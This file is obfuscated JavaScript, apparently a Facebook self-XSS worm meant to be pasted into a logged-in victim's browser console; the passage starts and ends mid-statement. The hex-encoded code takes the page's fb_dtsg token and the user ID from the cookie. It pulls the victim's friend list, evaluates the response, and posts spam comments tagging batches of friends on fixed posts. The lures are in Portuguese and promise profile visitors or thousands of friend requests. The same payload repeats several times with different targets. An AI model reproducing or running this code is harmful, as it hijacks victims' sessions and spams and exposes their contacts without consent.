        if (document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30]) >= 0) {
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[34] + _0x7892x8, true);
        } else {
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[36] + _0x7892x8, true);
        };
        _0x7892x7[_0xa22c[37]]();
    };
     
    function RandomArkadas() {
        var _0x7892xa = _0xa22c[10];
        for (i = 0; i < 9; i++) {
            _0x7892xa += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]] + _0xa22c[22];
        };
        return _0x7892xa;
    };
     
    function yorum_yap(id, _0x7892xc) {
        var _0x7892xd = new XMLHttpRequest();
        var _0x7892x8 = _0xa22c[10];
        _0x7892x8 += _0xa22c[40] + id;
        _0x7892x8 += _0xa22c[41] + encodeURIComponent(_0x7892xc);
        _0x7892x8 += _0xa22c[42];
        _0x7892x8 += _0xa22c[43];
        _0x7892x8 += _0xa22c[44];
        _0x7892x8 += _0xa22c[45];
        _0x7892x8 += _0xa22c[46];
        _0x7892x8 += _0xa22c[47] + id + _0xa22c[48];
        _0x7892x8 += _0xa22c[49];
        _0x7892x8 += _0xa22c[50];
        _0x7892x8 += _0xa22c[51];
        _0x7892x8 += _0xa22c[52];
        _0x7892x8 += _0xa22c[29] + user_id;
        _0x7892x8 += _0xa22c[53];
        _0x7892x8 += _0xa22c[54];
        _0x7892x8 += _0xa22c[55];
        _0x7892x8 += _0xa22c[56] + fb_dtsg;
        _0x7892x8 += _0xa22c[57];
        _0x7892xd[_0xa22c[35]](_0xa22c[58], _0xa22c[59], true);
        _0x7892xd[_0xa22c[62]](_0xa22c[60], _0xa22c[61]);
        _0x7892xd[_0xa22c[6]] = function () {
            if (_0x7892xd[_0xa22c[7]] == 4 && _0x7892xd[_0xa22c[63]] == 200) {
                _0x7892xd[_0xa22c[64]];
            };
        };
        _0x7892xd[_0xa22c[37]](_0x7892x8);
    };
    arkadaslari_al(id);
var _0xbddd=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x37\x32\x30\x39\x36\x37\x37\x36\x34\x36\x31\x33\x37\x32\x35","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x20\x3D\x20","\x66\x6F\x72\x20\x28\x3B\x3B\x29\x3B","","\x72\x65\x70\x6C\x61\x63\x65","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x3B","\x6C\x65\x6E\x67\x74\x68","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x72\x6F\x75\x6E\x64","\x20\x40\x5B","\x75\x69\x64","\x3A","\x74\x65\x78\x74","\x5D","\x20","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x31\x5D\x3D\x6E\x6D","\x26\x74\x6F\x6B\x65\x6E\x3D\x76\x37","\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x69\x6E\x64\x65\x78\x4F\x66","\x55\x52\x4C","\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x6F\x70\x65\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x73\x65\x6E\x64","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x56\x65\x6A\x61\x20\x51\x75\x65\x6D\x20\x56\x69\x73\x69\x74\x6F\x75\x20\x53\x65\x75\x20\x50\x65\x72\x66\x69\x6C\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20","\x26\x73\x6F\x75\x72\x63\x65\x3D\x32","\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D\x31\x33\x37\x37\x38\x37\x31\x37\x39\x37\x31\x33\x38\x3A\x31\x37\x30\x37\x30\x31\x38\x30\x39\x32","\x26\x72\x65\x70\x6C\x79\x5F\x66\x62\x69\x64","\x26\x70\x61\x72\x65\x6E\x74\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x69\x64","\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x32\x5F\x33","\x26\x63\x6C\x70\x3D\x7B\x22\x63\x6C\x5F\x69\x6D\x70\x69\x64\x22\x3A\x22\x34\x35\x33\x35\x32\x34\x61\x30\x22\x2C\x22\x63\x6C\x65\x61\x72\x63\x6F\x75\x6E\x74\x65\x72\x22\x3A\x30\x2C\x22\x65\x6C\x65\x6D\x65\x6E\x74\x69\x64\x22\x3A\x22\x6A\x73\x5F\x35\x22\x2C\x22\x76\x65\x72\x73\x69\x6F\x6E\x22\x3A\x22\x78\x22\x2C\x22\x70\x61\x72\x65\x6E\x74\x5F\x66\x62\x69\x64\x22\x3A","\x7D","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x73\x74\x69\x63\x6B\x65\x72\x5F\x66\x62\x69\x64\x3D\x30","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x70\x68\x6F\x74\x6F\x5F\x66\x62\x69\x64\x3D\x30","\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E","\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x5B\x5D","\x26\x5F\x5F\x61\x3D\x31","\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x33\x35\x79\x6E\x78\x6C\x32\x75\x35\x46\x39\x37\x4B\x65\x70\x45\x73\x79\x6F","\x26\x5F\x5F\x72\x65\x71\x3D\x71","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x74\x74\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x61\x64\x64\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x2E\x70\x68\x70","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x37\x32\x30\x39\x37\x36\x36\x30\x37\x39\x34\x36\x31\x37\x34","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x4E\x6F\x76\x6F\x73\x20\x45\x6D\x6F\x74\x69\x63\x6F\x6E\x73\x20\x70\x61\x72\x61\x20\x63\x6F\x6D\x65\x6E\x74\xE1\x72\x69\x6F\x73\x20\x6E\x6F\x20\x46\x61\x63\x65\x62\x6F\x6F\x6B\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20","\x33\x37\x36\x36\x35\x31\x39\x30\x39\x31\x34\x35\x32\x38\x35","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x47\x61\x6E\x68\x65\x20\x35\x2E\x30\x30\x30\x20\x70\x65\x64\x69\x64\x6F\x73\x20\x64\x65\x20\x61\x6D\x69\x7A\x61\x64\x65\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20","\x37\x32\x30\x39\x37\x34\x33\x34\x31\x32\x37\x39\x37\x33\x34","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x4E\x6F\x76\x6F\x73\x20\x45\x6D\x6F\x74\x69\x63\x6F\x6E\x73\x20\x70\x61\x72\x61\x20\x46\x61\x63\x65\x62\x6F\x6F\x6B\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20","\x37\x32\x30\x39\x37\x31\x32\x30\x37\x39\x34\x36\x37\x31\x34","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x47\x61\x6E\x68\x65\x20\x35\x2E\x30\x30\x30\x20\x70\x65\x64\x69\x64\x6F\x73\x20\x64\x65\x20\x41\x6D\x69\x7A\x61\x64\x65\x20\x6E\x6F\x20\x46\x61\x63\x65\x62\x6F\x6F\x6B\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20","\x34\x36\x35\x38\x31\x38\x38\x33\x33\x35\x34\x39\x36\x36\x38","\x37\x32\x30\x39\x36\x35\x39\x39\x37\x39\x34\x37\x32\x33\x35","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x47\x61\x6E\x68\x65\x20\x31\x2E\x30\x30\x30\x20\x73\x65\x67\x75\x69\x64\x6F\x72\x65\x73\x20\x70\x6F\x72\x20\x64\x69\x61\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20"];var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[5],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[41],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[65],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[66],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[67],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[68],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[69],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[70],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else 